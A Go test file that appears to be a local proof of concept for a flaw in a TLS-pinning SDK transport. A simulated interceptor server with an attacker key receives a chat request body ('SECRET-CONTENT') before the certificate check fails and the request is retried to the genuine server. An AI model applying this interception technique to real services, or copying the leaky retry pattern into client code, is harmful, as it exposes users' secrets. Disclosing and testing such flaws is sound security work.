package tinfoil

// Stealth check (local only): what happens after the leak if the attacker lets
// reVerifyingTransport's re-verification reach the genuine enclave? We cannot
// run a real Verify() offline, so this reproduces reVerifyingTransport lines
// 30-51 with the re-verification step assumed successful:
//
//   resp, err := transport.RoundTrip(req)            // -> interceptor (leak)
//   if isCertificateError(err) {
//       newHTTPClient := <verified client for genuine key>
//       return newHTTPClient.Transport.RoundTrip(req) // same *http.Request
//   }
//
// A local TCP "network" routes connection #1 to the interceptor and every later
// connection to the genuine (pinned-key) server.

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	"github.com/tinfoilsh/verifier/attestation"
	"github.com/tinfoilsh/verifier/client"
)

func certFor(t *testing.T, key *ecdsa.PrivateKey) tls.Certificate {
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject:      pkix.Name{CommonName: "host"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, pocCA.cert, &key.PublicKey, pocCA.key)
	if err != nil {
		t.Fatal(err)
	}
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key}
}

type simRetryTransport struct {
	first    http.RoundTripper
	verified http.RoundTripper
}

func (s *simRetryTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	resp, err := s.first.RoundTrip(req)
	if err == nil || !isCertificateError(err) {
		return resp, err
	}
	return s.verified.RoundTrip(req) // exactly what reVerifyingTransport does after a successful re-verify
}

func TestVerify3_SDKv0113_RetryAfterLeak(t *testing.T) {
	genuineKey, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	genuineFP := attestation.KeyFP(&genuineKey.PublicKey)
	attackerKey, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)

	var mu sync.Mutex
	var log []string
	mk := func(name string, key *ecdsa.PrivateKey) *httptest.Server {
		s := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			b, _ := io.ReadAll(r.Body)
			mu.Lock()
			log = append(log, fmt.Sprintf("%s got %s (%d body bytes): %s", name, r.URL.Path, len(b), string(b)))
			mu.Unlock()
			w.Header().Set("Content-Type", "application/json")
			io.WriteString(w, `{"id":"x","object":"chat.completion","created":0,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"`+name+` title"}}]}`)
		}))
		s.TLS = &tls.Config{Certificates: []tls.Certificate{certFor(t, key)}}
		s.StartTLS()
		return s
	}
	genuine := mk("GENUINE", genuineKey)
	defer genuine.Close()
	interceptor := mk("INTERCEPTOR", attackerKey)
	defer interceptor.Close()

	// Local "network": first TCP connection -> interceptor, later ones -> genuine.
	ln, _ := net.Listen("tcp", "127.0.0.1:0")
	defer ln.Close()
	var nconn int32
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			target := genuine.Listener.Addr().String()
			if atomic.AddInt32(&nconn, 1) == 1 {
				target = interceptor.Listener.Addr().String()
			}
			go func(c net.Conn, target string) {
				u, err := net.Dial("tcp", target)
				if err != nil {
					c.Close()
					return
				}
				go func() { io.Copy(u, c); u.Close() }()
				io.Copy(c, u)
				c.Close()
			}(c, target)
		}
	}()
	host := ln.Addr().String()

	hc := &http.Client{Transport: &simRetryTransport{
		first:    &client.TLSBoundRoundTripper{ExpectedPublicKey: genuineFP},
		verified: &client.TLSBoundRoundTripper{ExpectedPublicKey: genuineFP},
	}}
	oc := openai.NewClient(option.WithAPIKey("sk-KEY"), option.WithMaxRetries(0), option.WithHTTPClient(hc),
		option.WithBaseURL(fmt.Sprintf("https://%s/v1/", host)))
	res, err := oc.Chat.Completions.New(context.Background(), openai.ChatCompletionNewParams{
		Model: "m", Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("SECRET-CONTENT")},
	})
	mu.Lock()
	defer mu.Unlock()
	for _, l := range log {
		t.Log(l)
	}
	if err != nil {
		t.Logf("client-visible result: error: %v", err)
	} else {
		t.Logf("client-visible result: success, content=%q", res.Choices[0].Message.Content)
	}
	if len(log) == 0 || !strings.HasPrefix(log[0], "INTERCEPTOR") {
		t.Fatal("expected interceptor to see the first request")
	}
}
